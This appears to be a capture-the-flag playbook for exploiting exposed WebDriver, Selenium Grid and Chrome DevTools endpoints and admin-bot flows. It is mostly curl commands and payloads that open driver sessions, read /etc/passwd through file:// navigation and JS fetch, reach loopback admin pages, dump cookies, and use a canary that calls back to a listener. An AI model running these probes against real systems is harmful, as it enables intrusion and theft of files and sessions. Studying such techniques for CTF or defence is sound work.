# Detection playbook — the hunt, as an ordered procedure

## Procedure 1: the full surface sweep

```
STEP 1: read the handout
   grep -ri 'webdriver|chromedriver|geckodriver|selenium|webdriverio|
             puppeteer|playwright|headless|remote-debugging|bot|admin' .
   -> any hit names the port, the bot, or both

STEP 2: probe the driver ports
   for p in 9515 4444 9516 9517 4723 5555 7055; do
     curl -s -m5 -X POST http://T:$p/session -H 'Content-Type: application/json' \
       -d '{"capabilities":{"alwaysMatch":{"browserName":"chrome"}}}'
   done
   -> a sessionId on any = surface live

STEP 3: probe CDP
   curl -s -m5 http://T:9222/json
   -> a target list = CDP live

STEP 4: probe the app-proxied route
   curl -s -X POST http://T/session -d '{"capabilities":{"alwaysMatch":{"browserName":"chrome"}}}'
   curl -s -X POST http://T/wd/hub/session -d '...'
   -> a sessionId = a proxied driver

STEP 5: probe the Grid status
   curl -s http://T:4444/status | python3 -m json.tool
   -> node inventory = Grid live + the capability map
```

## Procedure 2: the bot-flow hunt

```
STEP 1: the report form
   a "report to admin" / "flag for review" / "contact admin" form
   -> a bot visits your submission

STEP 2: the stored field
   a comment/note/profile field the admin sees
   -> the bot renders your stored content

STEP 3: the trigger endpoint
   a /admin/visit /bot/visit /report endpoint you POST to
   -> the bot is invoked by your request

STEP 4: the challenge text
   "the admin will check" / "an admin will visit" / "bot will review"
   -> a bot flow exists even without source
```

## Procedure 3: the primitive map (once a session exists)

```
PRIMITIVE 1: file read
   nav file:///etc/passwd -> GET /source
   PASS: "root:x:0:0" in the body

PRIMITIVE 2: JS execution
   POST execute/sync {"script":"return 1+1","args":[]}
   PASS: returns 2

PRIMITIVE 3: JS file read
   POST execute/async {"script":"var d=arguments[0];fetch('file:///etc/passwd').then(r=>r.text()).then(d)"}
   PASS: the file text

PRIMITIVE 4: loopback
   nav localhost/admin -> GET /source
   PASS: content the external view lacks

PRIMITIVE 5: cookie jar
   GET /cookies
   PASS: a cookie list

PRIMITIVE 6: screenshot
   GET /screenshot
   PASS: a non-blank PNG

PRIMITIVE 7: CDP
   GET :9222/json
   PASS: a target list
```

## Procedure 4: the reproduction probe

```
STEP 1: extract the bot spec
   source: {url, credential, wait, flags[], version}
   observed: {url:your_input, credential:assumed, wait:~5s, flags:common}

STEP 2: build the local driver
   args = spec.flags; browser = spec.version

STEP 3: set the credential, navigate, wait
   add_cookie(spec.credential); goto(spec.url); wait(spec.wait)

STEP 4: verify the page matches live
   page.content() vs the live view — same DOM axes?
   divergence -> the reproduction is the bug, fix it
```

## Procedure 5: the bot-vs-fetch discriminator

```
SEND: a JS-execution canary to the "bot's" URL
   a payload that fetches your listener only if JS runs

A real browser:   runs the JS -> your listener gets a hit
A server fetch:   no JS/DOM -> no hit -> it's ../web-ssrf/, not this class
```

## The playbook decision tree

```
handout has driver/bot? --yes--> read it -> surface OR aid
                     \--no-> probe ports -> surface? -> primitive map
                                  \--no-> bot flow? -> aid (reproduce)
                                               \--no-> class dead
```
